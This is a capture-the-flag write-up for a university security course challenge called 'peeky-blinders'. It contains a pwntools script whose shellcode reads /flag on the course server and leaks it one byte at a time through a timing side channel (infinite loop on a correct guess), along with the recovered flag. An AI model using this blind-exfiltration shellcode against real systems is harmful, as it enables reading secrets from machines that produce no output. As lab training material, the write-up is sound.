# Player
- Tim Niklas Gruel 1080 2021 2831
- username: realy0sh1

# Writeup: "peeky-blinders"
- story:  Remember peek? Do it again. No output, no write, and no sendfile for you this time, though. Hint: The flag only changes when you spawn a new instance! Hint: The flag matches the following regular expression: softsec\{[0-9a-zA-Z_-]{64}\}
- start docker:
```
docker build -t peeky-blinders .
echo 'softsec{this_is_a_FAKE_flag-this_is_a_FAKE_flag-it_has_numbers_too_12345}' > flag
docker run --rm --mount "type=bind,src=$(pwd)/flag,dst=/flag" --cap-add SYS_ADMIN --security-opt apparmor=unconfined -p 1024:1024 -ti peeky-blinders
nc 127.0.0.1 1024
```
- idea: open file read char, check against guessed, finish if false, wait if we guessed correct:
```python
#!/usr/bin/env python3

import pwn

pwn.context.arch = 'amd64'

possible_values = "0123456789abcdefghijklmnopqrstuvwxyzABZDEFGHIJKLMNOPQRSTUVWXYZ_-}{"
possible_chars = list(possible_values)

# flag are 73 chars
flag = ""

for pos in range(73):
    for char in possible_chars:
        #conn = pwn.remote('127.0.0.1', 1024)
        conn = pwn.remote('tasks.ws24.softsec.rub.de', 33224)

        conn.recvuntil("please enter your (hex-encoded) shellcode, at most 4096 bytes: ".encode())
        
        shellcode = pwn.asm(f'''
            mov rbx, 0x00000067616c662f; # fd_flag = open("/flag", O_RDONLY)
            push rbx;
            mov rax, 2;
            mov rdi, rsp;
            mov rsi, 0;
            syscall;
            
            ;#https://syscalls.mebeim.net/?table=x86/64/x64/latest      
            xor rdx, rdx;
            push rdx; # push 10*8 = 80 Null bytes to the stack
            push rdx;
            push rdx;
            push rdx;
            push rdx;
            push rdx;
            push rdx;
            push rdx;
            push rdx;  
            push rdx;  
            mov rdi, rax;   # fd_flag was is rax, and open want it in rdi
            mov rsi, rsp;   # pointer to one byte buffer on stack
            mov rdx, 73;     # we want to read all 73 bytes of the flag              
            mov rax, 0;     # read is syscall 0
            syscall;

            ;#the bytes of the flag are now on the stack starting at rsp
            mov rax, [rsp + {pos}]
            cmp al, 0x{hex(ord(char))[2:]};   # compare flag of byte (in al) with hardcoded value (this round)
            je iloop;           
            ret;
            iloop:
                jmp iloop;
        ''')

        conn.sendline(shellcode.hex().encode())
        received = conn.recvuntil("Bye!".encode(), timeout=1)

        if received != b'':
            continue
        else:
            flag += char
            print(flag)
            break
```
- flag
```
softsec{jAAGNVr6982jaaHuPneqjKJquE_-abnQSLE4QPd9Oz6EoyInwbDbg5BoJM6AQTdy}
```